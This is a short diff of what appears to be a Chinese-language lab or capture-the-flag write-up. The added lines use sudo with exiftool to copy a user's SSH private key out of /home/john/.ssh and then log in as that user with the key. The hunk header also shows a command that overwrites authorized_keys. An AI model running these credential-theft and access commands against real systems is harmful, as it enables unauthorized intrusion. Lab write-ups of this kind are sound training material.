@@ -124,7 +124,10 @@ sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id
 
 换一个思路读取ssh私钥
 ```c
-sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa
+sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa+
+
+┌──(root㉿kali)-[~/.ssh]
+└─# ssh -i id_rsa john@192.168.18.238
 ```
 
 
